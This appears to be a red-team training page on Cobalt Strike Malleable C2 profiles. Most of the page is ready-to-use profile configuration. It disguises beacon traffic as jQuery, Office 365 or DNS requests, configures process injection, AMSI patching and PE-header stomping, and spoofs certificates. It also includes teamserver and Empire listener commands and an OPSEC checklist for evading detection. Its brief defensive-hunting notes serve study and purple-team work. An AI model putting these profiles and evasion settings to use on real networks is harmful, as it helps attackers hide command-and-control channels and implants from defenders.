---
layout: training-page
title: "Malleable C2 Profiles — Red Team Academy"
module: "C2 Frameworks"
tags:
  - malleable-c2
  - cobalt-strike
  - profiles
  - traffic-shaping
  - opsec
page_key: "c2-malleable-c2"
render_with_liquid: false
---

# Malleable C2 Profiles

Malleable C2 profiles (Cobalt Strike) transform beacon network traffic to mimic legitimate software — jQuery requests, Google Analytics, Amazon AWS, Slack API calls, etc. Well-crafted profiles defeat network-based IDS/NDR and make C2 traffic blend into normal enterprise traffic. Understanding profiles is essential for both offensive use and defensive hunting.

## Profile Structure

```
# Malleable C2 profile is a text file (.profile)
# Key sections:

# 1. Global options:
set sleeptime "30000";    # 30 second check-in interval
set jitter "20";          # ±20% random jitter
set maxdns "255";         # max DNS request size
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
set data_jitter "100";    # add 0-100 bytes random padding

# 2. HTTP GET transaction (beacon→server check-in):
http-get {
    set uri "/jquery-3.3.1.min.js /jquery-3.3.2.min.js";
    client {
        header "Accept" "text/javascript, application/javascript";
        header "Referer" "https://code.jquery.com/";
        metadata {
            base64url;
            parameter "__utm";   # disguise as Google Analytics
        }
    }
    server {
        header "Content-Type" "application/javascript";
        header "X-XSS-Protection" "1; mode=block";
        output {
            prepend "!function(e,t){\"use strict\";";
            append "}(window);";
            base64;
        }
    }
}

# 3. HTTP POST transaction (beacon→server task results):
http-post {
    set uri "/jquery-3.3.1.js";
    client {
        header "Content-Type" "application/x-www-form-urlencoded";
        output {
            base64url;
            parameter "q";   # looks like a query parameter
        }
        id {
            base64url;
            parameter "s";
        }
    }
    server {
        header "Content-Type" "application/javascript";
        output {
            print;
        }
    }
}
```

## Popular Profile Templates

```
# Malleable-C2-Profiles repository:
git clone https://github.com/BC-SECURITY/Malleable-C2-Profiles

# Categories:
# /normal/     — standard profiles
# /BBTz/       — bug bounty profiles
# /APT/        — APT mimicry profiles

# Amazon profile (mimics S3 traffic):
# /APT/amazon.profile

# jQuery profile (most common):
# /normal/jquery-c2.4.0.profile

# Slack API profile:
# /normal/slack.profile

# Google Analytics profile:
# /normal/googl_analytics.profile

# Validate profile with c2lint:
# (included with Cobalt Strike)
c2lint jquery-c2.profile

# Profile evaluation tool:
git clone https://github.com/cedowens/Malleable-C2-Profiles
python3 validateprofile.py -p jquery-c2.profile
```

## Advanced Profile Features

```
# Stage block — controls Beacon PE in memory:
stage {
    set stomppe "true";       # stomp MZ/PE header after load
    set obfuscate "true";     # obfuscate strings in Beacon
    set cleanup "true";       # free memory after injecting
    set userwx "false";       # don't use RWX memory
    set sleep_mask "true";    # encrypt in memory during sleep
    set smartinject "true";   # use module stomping

    # Remove PE characteristics that fingerprint Beacon:
    set checksum "0";
    set compile_time "01 Jan 2010 00:00:00";
    set entry_point "92145";
    set image_size_x86 "512000";
    set image_size_x64 "512000";
    set rich_header "\x00\x00\x00\x00";   # blank Rich header
}

# Process injection configuration:
process-inject {
    set startrwx "false";      # allocate RW, flip to RX after write
    set userwx "false";        # never use RWX
    set bof_reuse_memory "true";

    # Injection technique:
    transform-x64 {
        prepend "\x90\x90\x90\x90";  # NOP sled before shellcode
    }

    execute {
        CreateThread;          # CreateRemoteThread
        NtQueueApcThread;      # APC injection
        SetThreadContext;      # thread hijacking
        RtlCreateUserThread;   # RtlCreateUserThread
    }
}

# Post-exploitation block:
post-ex {
    set amsi_disable "true";     # patch AMSI
    set obfuscate "true";
    set cleanup "true";

    # Spawned process for post-ex jobs:
    set spawnto_x64 "%windir%\\sysnative\\WerFault.exe";
    set spawnto_x86 "%windir%\\syswow64\\WerFault.exe";
}
```

## Custom Profile Creation

```
# Create a profile mimicking Office 365 traffic:

set useragent "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.14326; Pro)";
set sleeptime "45000";
set jitter "15";

http-get {
    set uri "/owa/auth/owaauth.dll /autodiscover/autodiscover.xml";
    client {
        header "Accept" "application/xml, text/xml, */*";
        header "X-AnchorMailbox" "admin@contoso.com";
        metadata {
            base64;
            header "Cookie";
        }
    }
    server {
        header "Content-Type" "text/xml; charset=utf-8";
        header "X-CalculatedBETarget" "EXCH-01.contoso.com";
        output {
            base64;
            print;
        }
    }
}

http-post {
    set uri "/owa/service.svc";
    client {
        header "Content-Type" "application/json; charset=utf-8";
        header "Action" "GetItem";
        output {
            base64;
            print;
        }
        id {
            base64;
            header "X-RequestId";
        }
    }
}
```

## DNS & HTTPS Profiles

```
# DNS C2 profile:
dns-beacon {
    set dns_idle "8.8.4.4";       # idle response IP
    set dns_sleep "0";
    set maxdns "255";

    # Subdomain format:
    set beacon "cdn.";
    set get_A "www1.";
    set get_AAAA "www6.";
    set get_TXT "api.";
    set put_metadata "raw.";
    set put_output "dl.";
}

# HTTPS profile with SSL options:
https-certificate {
    set C "US";
    set CN "jquery.com";
    set O "jQuery Foundation";
    set OU "jQuery CDN";
    set validity "365";
}

# Or use real Let's Encrypt cert for legitimacy:
# Configure your redirector with a valid cert
# Profile points to redirector domain
```

## Profile OPSEC Considerations

```
# Common profile mistakes caught by defenders:

# 1. Default beacon metadata in cookie:
#    Default profile sends metadata as base64 cookie with no transformation
#    Fix: transform metadata, use custom headers

# 2. Content-length anomalies:
#    Beacon check-ins have consistent size if no data_jitter
#    Fix: set data_jitter

# 3. Known jQuery profile patterns:
#    "/jquery-3.3.1.min.js" URI is a well-known C2 indicator
#    Fix: use custom URIs mimicking your target org's actual traffic

# 4. SSL certificate fingerprint:
#    Self-signed cert with generic fields → flagged
#    Fix: use real cert, or cert matching the domain you're impersonating

# 5. Pivot from staging:
#    Default stager URL pattern (/ca)
#    Fix: use stageless payloads (cs generates beacon.exe without staging)

# Hunt for malleable C2:
# GreyNoise, Shodan, Censys scan for C2 IPs
# Look for: consistent SSL fingerprints, default URIs, beacon timing patterns
```

## BC-SECURITY Profile Pack

`BC-SECURITY/Malleable-C2-Profiles` aggregates and test-validates profiles for both Cobalt Strike and Empire's Malleable C2 Listener. Each profile has been run against Empire's listener to confirm it parses and beacons successfully — not every profile you find in random GitHub gists will.

Repository layout:

| Directory | Contents | Typical use |
|-----------|----------|-------------|
| `APT/` | State-actor mimicry (APT28, APT29, APT32/Ocean Lotus, Turla, Havex, Lazarus, Winnti) | Purple-team exercises; emulate a specific actor's traffic pattern |
| `Crimeware/` | Commodity malware (TrickBot, Dridex, Emotet, Cobalt Group, Zeus, Havex variants) | Blue-team detection tuning; blend with noise from real criminal infra |
| `Normal/` | Benign-service mimicry (jquery, amazon, bing, ocsp, safebrowsing) | Daily red-team ops — blend with traffic every network already allows |
| `template.profile` | Minimal skeleton with explanatory comments | Starting point for custom profiles |

```
# Use a BC-SECURITY profile with Cobalt Strike:
git clone https://github.com/BC-SECURITY/Malleable-C2-Profiles
cd Malleable-C2-Profiles
./c2lint ./Normal/jquery.profile                     # validate
./teamserver 10.0.0.5 'TeamserverPass' ./Normal/jquery.profile

# Use with Empire (set on a malleable listener):
(Empire: uselistener/http_malleable) > set Profile /opt/Malleable-C2-Profiles/Normal/jquery.profile
(Empire: uselistener/http_malleable) > execute
```

**Validation before use:**

- `c2lint` catches syntax mistakes that brick a teamserver start
- Run the profile and beacon once in a lab, capture it with Wireshark, and confirm it actually looks like the service it claims to mimic
- Strip or regenerate any `useragent` / `Host` header pinned to a defunct domain

**Profile-level OPSEC checklist:**

1. Change `set sample_name` (strings get signaturized)
2. Rotate SSL cert / pin CDN hostname to something you actually front
3. Confirm the GET/POST URIs don't match the profile's public version (sigs pivot off this)
4. Adjust `set sleeptime` / `set jitter` — most published profiles leave the default 60/0

## Resources

- BC-SECURITY Profiles — `github.com/BC-SECURITY/Malleable-C2-Profiles`
- Cobalt Strike Documentation — malleable C2
- threatexpress — `github.com/threatexpress/malleable-c2`
- Hunting Cobalt Strike — JARM fingerprinting blog
- Elastic — Malware Signatures in CS Profiles
- Ryan Hanson — CS profile research
